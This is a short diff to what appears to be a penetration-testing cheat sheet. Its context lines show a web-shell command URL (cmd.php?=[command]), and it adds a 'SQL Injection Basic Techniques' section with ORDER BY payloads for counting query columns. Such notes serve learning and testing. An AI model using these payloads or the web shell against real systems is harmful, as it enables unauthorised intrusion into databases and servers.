@@ -33,3 +33,12 @@ Access the web page
 http://yourIPaddress/cmd.php?=[command]
 ```
 
+## SQL Injection Basic Techniques
+
+Check number of columns by order by
+
+'''
+' ORDER BY 1;#
+' ORDER BY 2;#
+' ORDER BY 3;#
+'''
